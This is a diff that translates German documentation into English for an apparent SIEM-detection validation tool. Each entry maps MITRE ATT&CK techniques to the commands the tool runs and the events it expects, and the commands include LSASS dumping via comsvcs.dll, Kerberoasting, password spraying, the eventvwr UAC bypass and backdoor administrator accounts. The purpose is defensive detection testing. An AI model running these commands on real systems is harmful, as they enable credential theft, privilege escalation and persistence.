-**Warum das Angreifer tun:** `rundll32.exe` ist eine signierte Windows-Binärdatei (LOLBin), die beliebige DLL-Funktionen ausführen kann. Angreifer nutzen sie, um Application-Whitelisting zu umgehen, da `rundll32.exe` selbst als vertrauenswürdig gilt. Das Exabeam-Regelwerk für T1218 (116 Regeln gesamt) ist eines der umfangreichsten.
+**Why attackers do this:** `rundll32.exe` is a signed Windows binary (LOLBin) that can execute arbitrary DLL functions. Attackers use it to bypass application whitelisting, since `rundll32.exe` itself is considered trusted. The Exabeam rule set for T1218 (116 rules total) is one of the most comprehensive.
 
-**Erwartete SIEM-Events:**
-- `4688` — `rundll32.exe` mit ungewöhnlichen Argumenten
-- `Sysmon 1` — Prozesserstellung mit DLL-Argument
-- `Sysmon 7` — ImageLoaded — DLL wird durch Rundll32 geladen
+**Expected SIEM Events:**
+- `4688` — `rundll32.exe` with unusual arguments
+- `Sysmon 1` — Process creation with DLL argument
+- `Sysmon 7` — ImageLoaded — DLL loaded by Rundll32
 
 ---
 
 #### T1047 — WMI Execution
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1047](https://attack.mitre.org/techniques/T1047/) |
-| Taktik | Execution |
-| Exabeam-Regeln | 18 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Execution |
+| Exabeam Rules | 18 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# WMIC Prozess-Enumeration
+# WMIC process enumeration
 wmic process list brief
 
-# WMIC lokale Prozesserstellung (Kindprozess von WmiPrvSE.exe)
+# WMIC local process creation (child process of WmiPrvSE.exe)
 wmic process call create "cmd.exe /C whoami"
 
-# PowerShell Invoke-WmiMethod (generiert Sysmon Event 20)
+# PowerShell Invoke-WmiMethod (generates Sysmon Event 20)
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /C hostname"
 
-# WMI Systeminformationen (Recon über WMI-Interface)
+# WMI system information (recon via WMI interface)
 Get-WmiObject -Class Win32_OperatingSystem
 Get-WmiObject -Class Win32_ComputerSystem
 ```
 
-**Warum das Angreifer tun:** WMI ist ein nativer Windows-Mechanismus, der Prozesse ohne direkten `CreateProcess()`-Aufruf starten kann. Prozesse, die über WMI gestartet werden, haben `WmiPrvSE.exe` als Parent-Prozess statt `cmd.exe` oder `powershell.exe` — eine klassische Defense-Evasion-Technik. WMI-basierte Execution ist schwer zu erkennen ohne Sysmon Event 20.
+**Why attackers do this:** WMI is a native Windows mechanism that can start processes without a direct `CreateProcess()` call. Processes started via WMI have `WmiPrvSE.exe` as the parent process instead of `cmd.exe` or `powershell.exe` — a classic defense evasion technique. WMI-based execution is difficult to detect without Sysmon Event 20.
 
-**Erwartete SIEM-Events:**
-- `4688` — `wmic.exe` Prozesserstellung
-- `Sysmon 1` — Kindprozesse mit `WmiPrvSE.exe` als Parent
+**Expected SIEM Events:**
+- `4688` — `wmic.exe` process creation
+- `Sysmon 1` — Child processes with `WmiPrvSE.exe` as parent
 - `Sysmon 20` — WMI Activity Events
 
 ---
 
 #### T1110.001 — Password Brute Force
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
-| Taktik | Credential Access |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# 10 fehlgeschlagene NTLM-Authentifizierungsversuche
-# Ziel-Accounts existieren NICHT — keine echten Konten werden gesperrt
+# 10 failed NTLM authentication attempts
+# Target accounts do NOT exist — no real accounts are locked out
 for ($i = 1; $i -le 10; $i++) {
     $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(...)
     $ctx.ValidateCredentials("lognojutsu_nonexistent_$i", "WrongPassword$i!")
@@ -929,137 +928,137 @@ for ($i = 1; $i -le 10; $i++) {
 }
 ```
 
-**Warum das Angreifer tun:** Brute-Force-Angriffe auf Passwörter sind der klassischste Credential-Access-Vektor. Die Simulation erzeugt 10 Event-4625-Einträge in schneller Abfolge — das Basis-Erkennungsmuster für Brute-Force in nahezu jedem SIEM.
+**Why attackers do this:** Brute-force attacks on passwords are the most classic credential access vector. The simulation generates 10 Event 4625 entries in rapid succession — the basic detection pattern for brute force in almost every SIEM.
 
-**Erwartete SIEM-Events:**
-- `4625` × 10 — "Account failed to log on" in schneller Abfolge
-- `4740` — Account Lockout (wenn Lockout-Policy greift)
+**Expected SIEM Events:**
+- `4625` × 10 — "Account failed to log on" in rapid succession
+- `4740` — Account Lockout (if lockout policy applies)
 
 ---
 
 #### T1110.003 — Password Spraying
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) |
-| Taktik | Credential Access |
-| Exabeam-Regeln | **1** (Gap-Validierung!) |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Exabeam Rules | **1** (Gap validation!) |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Enumerate alle aktivierten lokalen Accounts
+# Enumerate all enabled local accounts
 $accounts = Get-LocalUser | Where-Object { $_.Enabled }
 
-# Ein einziges Passwort gegen alle Accounts — verhindert Lockout
+# A single password against all accounts — prevents lockout
 foreach ($account in $accounts | Select-Object -First 5) {
     $ctx.ValidateCredentials($account.Name, "Password1_SPRAY_SIM_INVALID")
-    Start-Sleep -Milliseconds 500  # Langsame Rate = Low-and-Slow-Muster
+    Start-Sleep -Milliseconds 500  # Slow rate = low-and-slow pattern
 }
 ```
 
-**Warum das Angreifer tun:** Password Spraying umgeht Account-Lockout-Richtlinien, indem nur ein Passwort pro Account versucht wird. Dies ist eine der häufigsten Initial-Access-Techniken in echten Incidents (Microsoft, Okta, SolarWinds alle betroffen). **Mit nur 1 Exabeam-Regel ist dies eine der wichtigsten Gap-Validierungen.**
+**Why attackers do this:** Password spraying bypasses account lockout policies by only trying one password per account. This is one of the most common initial access techniques in real incidents (Microsoft, Okta, SolarWinds all affected). **With only 1 Exabeam rule, this is one of the most important gap validations.**
 
-**Erwartete SIEM-Events:**
-- `4625` — Fehlgeschlagene Anmeldungen über mehrere Accounts verteilt
-- `4771` — Kerberos pre-auth failed (auf Domain-Systemen)
+**Expected SIEM Events:**
+- `4625` — Failed logons distributed across multiple accounts
+- `4771` — Kerberos pre-auth failed (on domain systems)
 
 ---
 
 #### T1003.001 — LSASS Memory Access
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) |
-| Taktik | Credential Access |
-| Exabeam-Regeln | 18 |
-| Admin erforderlich | **Ja** |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Exabeam Rules | 18 |
+| Admin Required | **Yes** |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
 # Method 1: comsvcs.dll MiniDump via rundll32 — LOLBin approach (Sysmon EID 1+10+11)
-# Generiert exakt die Events, die ProcDump und Cobalt Strike erzeugen
+# Generates exactly the events that ProcDump and Cobalt Strike generate
 $lsassPID = (Get-Process lsass).Id
 $dumpPath = "$env:TEMP\lsass_sim.dmp"
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full
 
-# Method 2: Windows-API OpenProcess mit GrantedAccess=0x1010
-# 0x1010 = PROCESS_VM_READ (0x0010) | PROCESS_QUERY_INFORMATION (0x0400) — exakter Mimikatz/SafetyKatz-Wert
-# Das ist das Flag, auf das Sysmon EID 10 und SIEM-Regeln prüfen (0x0400 allein triggert deutlich weniger Regeln)
+# Method 2: Windows API OpenProcess with GrantedAccess=0x1010
+# 0x1010 = PROCESS_VM_READ (0x0010) | PROCESS_QUERY_INFORMATION (0x0400) — exact Mimikatz/SafetyKatz value
+# This is the flag that Sysmon EID 10 and SIEM rules check for (0x0400 alone triggers far fewer rules)
 $handle = [LNJ01.LNJWin]::OpenProcess(0x1010, $false, $lsassPID)
-[LNJ01.LNJWin]::CloseHandle($handle)  # KEINE Credential-Extraktion
+[LNJ01.LNJWin]::CloseHandle($handle)  # NO credential extraction
 
-# Method 3: ProcDump-ähnlicher Zugriff mit 0x1fffff (PROCESS_ALL_ACCESS)
+# Method 3: ProcDump-like access with 0x1fffff (PROCESS_ALL_ACCESS)
 $handle2 = [LNJ01.LNJWin]::OpenProcess(0x1fffff, $false, $lsassPID)
 [LNJ01.LNJWin]::CloseHandle($handle2)
 ```
 
-**Warum das Angreifer tun:** LSASS (Local Security Authority Subsystem Service) speichert Passwort-Hashes und Kerberos-Tickets im Speicher. Tools wie Mimikatz, Procdump und Task Manager können den LSASS-Prozess dumpen. Der kritische Unterschied: `GrantedAccess=0x1010` ist der exakte Zugriffsmaskenwert von Mimikatz — SIEM-Regeln prüfen auf diesen spezifischen Wert im Sysmon-10-Event. Das LOLBin-Verfahren über `comsvcs.dll MiniDump` generiert zusätzlich Sysmon EID 11 (FileCreate) für die Dump-Datei.
+**Why attackers do this:** LSASS (Local Security Authority Subsystem Service) stores password hashes and Kerberos tickets in memory. Tools like Mimikatz, Procdump, and Task Manager can dump the LSASS process. The critical difference: `GrantedAccess=0x1010` is the exact access mask value of Mimikatz — SIEM rules check for this specific value in the Sysmon 10 event. The LOLBin method via `comsvcs.dll MiniDump` additionally generates Sysmon EID 11 (FileCreate) for the dump file.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 10` — ProcessAccess: `TargetImage = lsass.exe`, `GrantedAccess = 0x1010` — **primäres Credential-Dumping-Signal**
-- `Sysmon 1` — `rundll32.exe` mit `comsvcs.dll, MiniDump`-Argument (LOLBin-Erkennung)
-- `Sysmon 11` — FileCreate: `.dmp`-Datei in `%TEMP%` (Dump-Datei-Erkennung)
-- `4688` — `rundll32.exe` Prozesserstellung mit comsvcs.dll
+**Expected SIEM Events:**
+- `Sysmon 10` — ProcessAccess: `TargetImage = lsass.exe`, `GrantedAccess = 0x1010` — **primary credential dumping signal**
+- `Sysmon 1` — `rundll32.exe` with `comsvcs.dll, MiniDump` argument (LOLBin detection)
+- `Sysmon 11` — FileCreate: `.dmp` file in `%TEMP%` (dump file detection)
+- `4688` — `rundll32.exe` process creation with comsvcs.dll
 
 ---
 
 #### T1003.006 — DCSync Simulation
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) |
-| Taktik | Credential Access |
-| Exabeam-Regeln | 4 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Exabeam Rules | 4 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Enumerate Domain Controller (attacker recon vor DCSync)
+# Enumerate Domain Controller (attacker recon before DCSync)
 nltest /dclist:$env:USERDOMAIN
 nltest /dsgetdc:$env:USERDOMAIN
 
-# Accounts mit DS-Replication-Rechten suchen (DCSync-Ziel-Identifikation)
+# Search accounts with DS-Replication rights (DCSync target identification)
 $searcher = [ADSISearcher]"(&(objectClass=user)(userAccountControl:...:=512))"
 
-# Domain Admins / Enterprise Admins auflisten (DCSync-fähige Gruppen)
+# List Domain Admins / Enterprise Admins (DCSync-capable groups)
 foreach ($group in @("Domain Admins", "Enterprise Admins")) {
     $groupObj = [ADSI]"LDAP://CN=$group,CN=Users,$domainDN"
 }
 
-# Domain-Objekt ACL auf Replication-Rechte prüfen
+# Check domain object ACL for replication rights
 Get-Acl "AD:\$((Get-ADDomain).DistinguishedName)"
 ```
 
-**Warum das Angreifer tun:** DCSync missbraucht das MS-DRSR-Protokoll (Directory Replication Service Remote Protocol) um Passwort-Hashes direkt vom Domain Controller zu replizieren — ohne Code auf dem DC auszuführen. Das einzige sichtbare Signal ist Event 4662 (Directory Service object access) mit den Replication-Rechte-GUIDs. Mimikatz-Befehl: `lsadump::dcsync /domain:corp /user:Administrator`.
+**Why attackers do this:** DCSync abuses the MS-DRSR protocol (Directory Replication Service Remote Protocol) to replicate password hashes directly from the domain controller — without executing code on the DC. The only visible signal is Event 4662 (Directory Service object access) with the Replication rights GUIDs. Mimikatz command: `lsadump::dcsync /domain:corp /user:Administrator`.
 
-**Erwartete SIEM-Events:**
+**Expected SIEM Events:**
 - `4662` — Directory Service object access (Replication rights)
-- `4688` — `nltest.exe` Prozesserstellung
-- `4769` — Kerberos TGS für DRSUAPI-Service
+- `4688` — `nltest.exe` process creation
+- `4769` — Kerberos TGS for DRSUAPI service
 
 ---
 
 #### T1552.001 — Credentials in Files
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
-| Taktik | Credential Access |
-| Exabeam-Regeln | 2 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Exabeam Rules | 2 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Durchsucht bekannte Credential-Speicher-Pfade
+# Searches known credential storage paths
 $paths = @($env:USERPROFILE, $env:APPDATA, "C:\inetpub", "C:\xampp")
 $patterns = @("password", "passwd", "secret", "apikey", "connectionstring")
 $extensions = @("*.xml", "*.ini", "*.config", "*.txt", "*.ps1", "*.bat")
@@ -1069,107 +1068,107 @@ foreach ($path in $paths) {
         Where-Object { (Get-Content $_.FullName) -match $pattern }
 }
 
-# findstr als cmd-Variante (generiert 4688 für findstr.exe)
+# findstr as cmd variant (generates 4688 for findstr.exe)
 cmd.exe /C "findstr /si password $env:USERPROFILE\*.xml *.ini *.txt"
 ```
 
-**Warum das Angreifer tun:** Konfigurationsdateien, Deployment-Skripte und Anwendungs-Configs enthalten häufig Passwörter im Klartext. Web-Server-Konfigurationen (IIS, Apache), Datenbankverbindungsstrings und PowerShell-Skripte sind die häufigsten Fundorte. `findstr /si password` ist ein bekanntes Angreifer-Kommando.
+**Why attackers do this:** Configuration files, deployment scripts, and application configs frequently contain passwords in plaintext. Web server configurations (IIS, Apache), database connection strings, and PowerShell scripts are the most common locations. `findstr /si password` is a well-known attacker command.
 
-**Erwartete SIEM-Events:**
-- `4104` — ScriptBlock-Logging: Dateisystem-Traversal mit Credential-Suchmustern
-- `4688` — `findstr.exe` mit `password`-Argument
+**Expected SIEM Events:**
+- `4104` — ScriptBlock logging: filesystem traversal with credential search patterns
+- `4688` — `findstr.exe` with `password` argument
 
 ---
 
 #### T1558.003 — Kerberoasting
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) |
-| Taktik | Credential Access |
-| Exabeam-Regeln | 22 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Credential Access |
+| Exabeam Rules | 22 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# 1. LDAP-Abfrage: Accounts mit Service Principal Names (Kerberoasting-Ziele)
+# 1. LDAP query: accounts with Service Principal Names (Kerberoasting targets)
 $spnAccounts = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll()
 
-# 2. Kerberos Service Tickets für gefundene SPNs anfordern (generiert Event 4769)
+# 2. Request Kerberos service tickets for found SPNs (generates Event 4769)
 Add-Type -AssemblyName System.IdentityModel
 foreach ($spn in $discoveredSPNs) {
     $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($spn)
-    # Ticket wird im Speicher gecacht — normalerweise dann offline geknackt
+    # Ticket is cached in memory — normally then cracked offline
 }
 
-# 3. Gecachte Kerberos-Tickets anzeigen
+# 3. Display cached Kerberos tickets
 klist
 ```
 
-**Warum das Angreifer tun:** Kerberoasting ermöglicht es, Passwort-Hashes von Service-Accounts offline zu knacken, ohne Admin-Rechte zu benötigen. Der Angreifer fordert Service-Tickets für Accounts mit SPNs an (normales Kerberos-Verhalten), extrahiert den verschlüsselten Teil und knackt ihn offline mit Hashcat. Event 4769 mit RC4-Verschlüsselung (etype 23) statt AES ist das Erkennungssignal.
+**Why attackers do this:** Kerberoasting allows cracking password hashes of service accounts offline without requiring admin rights. The attacker requests service tickets for accounts with SPNs (normal Kerberos behavior), extracts the encrypted part, and cracks it offline with Hashcat. Event 4769 with RC4 encryption (etype 23) instead of AES is the detection signal.
 
-**Erwartete SIEM-Events:**
-- `4769` — Kerberos Service Ticket Request — **primäres Kerberoasting-Signal**
+**Expected SIEM Events:**
+- `4769` — Kerberos Service Ticket Request — **primary Kerberoasting signal**
 - `4768` — Kerberos TGT Request
-- `4104` — ScriptBlock: SPN-Enumeration via LDAP
+- `4104` — ScriptBlock: SPN enumeration via LDAP
 
 ---
 
 #### T1550.002 — Pass the Hash Pattern
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) |
-| Taktik | Lateral Movement |
-| Exabeam-Regeln | 23 |
-| Admin erforderlich | Nein |
-| Cleanup | Ja — Netzwerkverbindungen |
+| Tactic | Lateral Movement |
+| Exabeam Rules | 23 |
+| Admin Required | No |
+| Cleanup | Yes — network connections |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# NTLM-basierter Netzwerk-Share-Zugriff (generiert Event 4776/4624 type 3)
+# NTLM-based network share access (generates Event 4776/4624 type 3)
 net use \\$localHost\IPC$ /user:$env:USERNAME ""
 
-# Lateral Attempts zu mehreren Hosts (PtH-Spray-Muster)
+# Lateral attempts to multiple hosts (PtH spray pattern)
 foreach ($target in @($env:COMPUTERNAME, "127.0.0.1", "localhost")) {
     net use \\$target\IPC$
 }
 
-# Explicit Credential Use (generiert Event 4648 — core PtH-Signal)
+# Explicit credential use (generates Event 4648 — core PtH signal)
 cmdkey /add:$env:COMPUTERNAME /user:"$domain\$username" /pass:"..."
 ```
 
-**Warum das Angreifer tun:** Pass-the-Hash verwendet den NTLM-Hash eines Passworts statt des Klartexts für Authentifizierung. Das primäre Erkennungssignal sind Event 4648 (explicit credential use) kombiniert mit Event 4624 Typ 3 (network logon) via NTLM. Exabeam hat 23 dedizierte Regeln für dieses Muster. Der tatsächliche PtH-Angriff erfordert Mimikatz (`sekurlsa::pth`).
+**Why attackers do this:** Pass-the-Hash uses the NTLM hash of a password instead of the plaintext for authentication. The primary detection signal is Event 4648 (explicit credential use) combined with Event 4624 Type 3 (network logon) via NTLM. Exabeam has 23 dedicated rules for this pattern. The actual PtH attack requires Mimikatz (`sekurlsa::pth`).
 
-**Erwartete SIEM-Events:**
-- `4648` — Logon mit expliziten Credentials — **primäres PtH-Signal**
-- `4624` Typ 3 — Netzwerk-Logon via NTLM
-- `4776` — NTLM Credential-Validierung
+**Expected SIEM Events:**
+- `4648` — Logon with explicit credentials — **primary PtH signal**
+- `4624` Type 3 — Network logon via NTLM
+- `4776` — NTLM credential validation
 
 ---
 
 #### T1136.001 — Create Local Account
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) |
-| Taktik | Persistence |
-| Exabeam-Regeln | 10 |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Account wird gelöscht |
+| Tactic | Persistence |
+| Exabeam Rules | 10 |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Account is deleted |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
-Benutzername: lnj_test_acct
-Passwort:     LogNoJutsu!Temp2024
-Kommentar:    LogNoJutsu SIEM validation test account
+Username: lnj_test_acct
+Password: LogNoJutsu!Temp2024
+Comment:  LogNoJutsu SIEM validation test account
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```cmd
 net user lnj_test_acct LogNoJutsu!Temp2024 /add /comment:"LogNoJutsu test"
@@ -1181,41 +1180,41 @@ net user lnj_test_acct LogNoJutsu!Temp2024 /add /comment:"LogNoJutsu test"
 net user lnj_test_acct /delete
 ```
 
-**Warum das Angreifer tun:** Das Anlegen eines backdoor-Benutzerkontos ist eine der persistentesten Hintertüren, die ein Angreifer hinterlassen kann. Event 4720 ist das direkte Signal. Exabeam prüft zusätzlich, ob das neue Konto ungewöhnliche Eigenschaften hat (z.B. kein Passwort-Ablaufdatum, unbekannte Naming Convention).
+**Why attackers do this:** Creating a backdoor user account is one of the most persistent backdoors an attacker can leave behind. Event 4720 is the direct signal. Exabeam additionally checks whether the new account has unusual properties (e.g., no password expiration, unknown naming convention).
 
-**Erwartete SIEM-Events:**
-- `4720` — User account created — **Kern-Event für Account Manipulation Use Case**
+**Expected SIEM Events:**
+- `4720` — User account created — **core event for Account Manipulation use case**
 - `4722` — User account enabled
-- `4688` — `net.exe` mit `/add` Argument
+- `4688` — `net.exe` with `/add` argument
 
 ---
 
 #### T1098 — Account Manipulation (Add to Administrators)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1098](https://attack.mitre.org/techniques/T1098/) |
-| Taktik | Persistence, Privilege Escalation |
-| Exabeam-Regeln | **57** |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Gruppen-Mitgliedschaft und Account entfernt |
+| Tactic | Persistence, Privilege Escalation |
+| Exabeam Rules | **57** |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Group membership and account removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: Account anlegen (EID 4720)
+# Step 1: Create account (EID 4720)
 net user LNJManipUser "P@ssw0rd123!" /add /comment:"Windows Service Account" /fullname:"Windows Update Agent"
 
-# Step 2: Zu Administrators hinzufügen (EID 4732 — Exabeam Account-Manipulation-Trigger)
+# Step 2: Add to Administrators (EID 4732 — Exabeam Account Manipulation trigger)
 net localgroup Administrators LNJManipUser /add
 
-# Step 3: Account-Eigenschaften modifizieren (EID 4738 — PasswordNeverExpires)
+# Step 3: Modify account properties (EID 4738 — PasswordNeverExpires)
 Set-LocalUser -Name "LNJManipUser" -PasswordNeverExpires $true -UserMayNotChangePassword $true
 
-# Step 4: Passwort ändern via net user (EID 4723)
+# Step 4: Change password via net user (EID 4723)
 net user LNJManipUser "NewP@ssw0rd456!"
 
-# Step 5: Account deaktivieren + re-aktivieren (EID 4725 + 4722)
+# Step 5: Disable + re-enable account (EID 4725 + 4722)
 net user LNJManipUser /active:no
 net user LNJManipUser /active:yes
 ```
@@ -1227,44 +1226,44 @@ net localgroup Administrators LNJManipUser /delete
 net user LNJManipUser /delete
 ```
 
-**Warum das Angreifer tun:** Die vollständige Account-Manipulation-Kette (Anlegen + Eskalation + Attribute-Änderung + Passwort) ist die authentische APT-Backdoor-Sequenz. Exabeam hat 57 Regeln für T1098, weil jeder Schritt ein eigenes Event erzeugt. `PasswordNeverExpires=True` (EID 4738) ist ein starkes Signal, dass ein Account für langfristige Persistenz vorbereitet wird.
+**Why attackers do this:** The complete account manipulation chain (creation + escalation + attribute change + password) is the authentic APT backdoor sequence. Exabeam has 57 rules for T1098 because each step generates its own event. `PasswordNeverExpires=True` (EID 4738) is a strong signal that an account is being prepared for long-term persistence.
 
-**Erwartete SIEM-Events:**
+**Expected SIEM Events:**
 - `4720` — User account created
-- `4732` — Member added to Administrators — **primäres Account-Manipulation-Signal**
+- `4732` — Member added to Administrators — **primary Account Manipulation signal**
 - `4738` — User account changed (PasswordNeverExpires, UserMayNotChangePassword)
 - `4723` — Password change attempted
 - `4725` — Account disabled + `4722` — Account re-enabled
-- `4688` — `net.exe` mit Benutzer-Management-Argumenten
+- `4688` — `net.exe` with user management arguments
 
 ---
 
 #### T1548.002 — UAC Bypass via Event Viewer
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1548.002](https://attack.mitre.org/techniques/T1548/002/) |
-| Taktik | Privilege Escalation, Defense Evasion |
-| Exabeam-Regeln | 10 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — Registry-Key entfernt |
+| Tactic | Privilege Escalation, Defense Evasion |
+| Exabeam Rules | 10 |
+| Admin Required | No |
+| Cleanup | **Yes** — Registry key removed |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
 Registry: HKCU\Software\Classes\mscfile\shell\open\command
-Wert:     cmd.exe /K echo LogNoJutsu-UAC-Bypass-Simulation
+Value:    cmd.exe /K echo LogNoJutsu-UAC-Bypass-Simulation
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Registry-Hijack setzen (Sysmon Event 12/13)
+# Set registry hijack (Sysmon Event 12/13)
 $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
 New-Item -Path $regPath -Force | Out-Null
 Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /K echo UAC-Bypass-Sim"
 
-# eventvwr.exe triggern (liest den manipulierten Registry-Key)
+# Trigger eventvwr.exe (reads the manipulated registry key)
 Start-Process "eventvwr.exe" -WindowStyle Hidden
 ```
 
@@ -1274,34 +1273,34 @@ Start-Process "eventvwr.exe" -WindowStyle Hidden
 Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
 ```
 
-**Warum das Angreifer tun:** Die eventvwr-UAC-Bypass-Methode ermöglicht es, Code als Administrator auszuführen, ohne einen UAC-Dialog zu erzeugen. `eventvwr.exe` liest den `mscfile`-Shell-Handler aus der Registry — durch Überschreiben in `HKCU` (ohne Admin-Rechte möglich) kann beliebiger Code mit erhöhten Rechten ausgeführt werden. Das Sysmon-13-Event auf diesen spezifischen Registry-Pfad ist das Erkennungssignal.
+**Why attackers do this:** The eventvwr UAC bypass method allows code to be executed as an administrator without generating a UAC dialog. `eventvwr.exe` reads the `mscfile` shell handler from the registry — by overwriting it in `HKCU` (possible without admin rights), arbitrary code can be executed with elevated privileges. The Sysmon 13 event on this specific registry path is the detection signal.
 
-**Erwartete SIEM-Events:**
+**Expected SIEM Events:**
 - `Sysmon 12` — RegistryEvent (Key created): `HKCU\Software\Classes\mscfile\...`
 - `Sysmon 13` — RegistryEvent (Value set) — **UAC Bypass Indicator**
-- `4688` — `eventvwr.exe` Prozesserstellung
+- `4688` — `eventvwr.exe` process creation
 
 ---
 
 #### T1547.001 — Registry Run Key Persistence
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) |
-| Taktik | Persistence |
-| Exabeam-Regeln | 10 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — Registry-Eintrag wird entfernt |
+| Tactic | Persistence |
+| Exabeam Rules | 10 |
+| Admin Required | No |
+| Cleanup | **Yes** — Registry entry is removed |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
-Pfad:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Path:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 Name:  LogNoJutsu_Persistence_Test
-Wert:  C:\Windows\System32\notepad.exe
+Value: C:\Windows\System32\notepad.exe
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
@@ -1316,34 +1315,34 @@ Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
     -Name "LogNoJutsu_Persistence_Test" -Force
 ```
 
-**Warum das Angreifer tun:** Run-Keys sind der einfachste Persistenz-Mechanismus auf Windows — sie werden bei jedem Benutzer-Login ausgeführt. Angreifer verwenden sie um Backdoors nach Reboots zu erhalten. Sysmon Event 13 auf `CurrentVersion\Run` ist ein direktes Erkennungssignal.
+**Why attackers do this:** Run keys are the simplest persistence mechanism on Windows — they are executed at every user login. Attackers use them to maintain backdoors after reboots. Sysmon Event 13 on `CurrentVersion\Run` is a direct detection signal.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 13` — RegistryEvent (Value Set) auf `CurrentVersion\Run`
-- `4688` — `reg.exe` oder `powershell.exe`
+**Expected SIEM Events:**
+- `Sysmon 13` — RegistryEvent (Value Set) on `CurrentVersion\Run`
+- `4688` — `reg.exe` or `powershell.exe`
 
 ---
 
 #### T1053.005 — Scheduled Task Persistence
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |
-| Taktik | Persistence |
-| Exabeam-Regeln | 27 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — Task wird deregistriert |
+| Tactic | Persistence |
+| Exabeam Rules | 27 |
+| Admin Required | No |
+| Cleanup | **Yes** — Task is deregistered |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
-Task-Name:    LogNoJutsu_Task_Test
-Ausführung:   notepad.exe
-Trigger:      Bei Benutzer-Anmeldung
-Einstellung:  Versteckt (Hidden)
+Task Name:    LogNoJutsu_Task_Test
+Execution:    notepad.exe
+Trigger:      At user logon
+Setting:      Hidden
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
 $action   = New-ScheduledTaskAction -Execute "notepad.exe"
@@ -1359,34 +1358,34 @@ Register-ScheduledTask -TaskName "LogNoJutsu_Task_Test" `
 Unregister-ScheduledTask -TaskName "LogNoJutsu_Task_Test" -Confirm:$false
 ```
 
